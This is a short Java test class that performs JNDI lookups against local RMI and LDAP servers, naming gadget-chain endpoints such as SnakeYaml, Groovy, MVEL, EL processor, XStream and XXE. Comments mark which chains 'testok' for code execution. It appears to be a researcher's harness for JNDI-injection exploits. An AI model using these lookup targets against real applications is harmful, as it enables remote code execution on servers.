
import javax.naming.InitialContext;

public class JNDI_Test {
    public static void main(String[] args) throws Exception{
        //Object object=new InitialContext().lookup("ldap://127.0.0.1:6666/calc");
        //Object object=new InitialContext().lookup("rmi://127.0.0.1:6666/Object");


//        // SnakeYaml    testok
//        Object object=new InitialContext().lookup("rmi://127.0.0.1:1098/execBySnakeYaml");

//        // groovyshell     testok
        Object object=new InitialContext().lookup("rmi://127.0.0.1:1098/ExecByGroovy");

//        // MLet
//        //Object object=new InitialContext().lookup("rmi://127.0.0.1:1098/MletFind");
//        // el test
//        Object object=new InitialContext().lookup("rmi://127.0.0.1:1098/elProcessor");

//        // tomcatGroovyClassLoader testok
//        Object object=new InitialContext().lookup("rmi://127.0.0.1:1098/tomcatGroovyClassLoader");

//        // tomcat_MVEL  testok
//        Object object=new InitialContext().lookup("rmi://127.0.0.1:1098/tomcat_MVEL");

//        // tomcat_xstream   testfail
//        Object object=new InitialContext().lookup("rmi://127.0.0.1:1098/tomcat_xstream");

//        // XXE   testok
//        Object object=new InitialContext().lookup("rmi://127.0.0.1:1098/XXEexp");
    }
}